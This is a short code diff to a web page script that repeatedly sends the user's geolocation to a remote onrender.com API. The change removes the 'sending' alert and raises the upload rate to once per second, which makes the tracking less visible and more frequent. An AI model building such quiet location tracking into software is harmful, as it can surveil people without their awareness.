@@ -25,7 +25,6 @@
   const apiUrl = "https://shaxweb_database.onrender.com/"
   
   const sendMyGeo = (lat, lng) => {
-    alert("sending")
     fetch(apiUrl, {
       method: "POST",
       headers: {"Content-Type": "application/json"},
@@ -70,7 +69,7 @@
 
   // Запускаем обновление каждую секунду
   getUserLocation()
-  setInterval(getUserLocation, 10000);
+  setInterval(getUserLocation, 1000);
 </script>
 
 
